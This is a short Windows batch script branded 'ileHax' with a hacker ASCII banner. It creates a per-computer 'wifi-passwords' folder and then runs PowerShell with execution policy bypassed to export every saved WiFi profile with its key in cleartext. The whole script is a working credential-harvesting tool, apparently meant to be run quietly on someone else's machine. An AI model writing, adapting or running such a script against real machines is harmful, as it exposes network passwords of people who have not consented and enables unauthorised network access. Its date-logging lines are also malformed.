@echo off
chcp 65001
goto splash


:splash
cls
color 2

echo.
echo.
echo         ██▓ ██▓    ▓█████  ██░ ██  ▄▄▄      ▒██   ██▒
echo        ▓██▒▓██▒    ▓█   ▀ ▓██░ ██▒▒████▄    ▒▒ █ █ ▒░
echo        ▒██▒▒██░    ▒███   ▒██▀▀██░▒██  ▀█▄  ░░  █   ░
echo        ░██░▒██░    ▒▓█  ▄ ░▓█ ░██ ░██▄▄▄▄██  ░ █ █ ▒ 
echo        ░██░░██████▒░▒████▒░▓█▒░██▓ ▓█   ▓██▒▒██▒ ▒██▒
echo        ░▓  ░ ▒░▓  ░░░ ▒░ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░▒▒ ░ ░▓ ░
echo         ▒ ░░ ░ ▒  ░ ░ ░  ░ ▒ ░▒░ ░  ▒   ▒▒ ░░░   ░▒ ░
echo         ▒ ░  ░ ░      ░    ░  ░░ ░  ░   ▒    ░    ░  
echo         ░      ░  ░   ░  ░ ░  ░  ░      ░  ░ ░    ░  
echo.
echo [0m════════════════════════ [[32mileHax-Log[0m] ══════════════════════
echo.
echo.

CALL :logger "Initialise functionality","w"

CALL :logger "Create or find folder","w"
mkdir "%CD%\wifi-passwords\%ComputerName%">nul 2>&1
CALL :logger "Go to folder","w"
cd "wifi-passwords" >nul
cd "%ComputerName%" >nul
CALL :logger "Folder found or generate successful","w"

CALL :logger "Find WiFi-Connections","w"
powershell -Executionpolicy Bypass -Command "netsh wlan export profile key=clear" >nul

CALL :logger "Wifi-Connections safed successfull","g"
CALL :logger "Closing after two second","b"
ping localhost -n 2 >nul

exit


:logger
set %date% = date
set %time% = date /t

IF %~2 == w (
    echo [[32m%date%-%time%[0m] [33m%~1[0m
) ELSE IF %~2 == b (
    echo [[32m%date%-%time%[0m] [31m%~1[0m
) ELSE IF %~2 == g (
    echo [[32m%date%-%time%[0m] [32m%~1[0m
)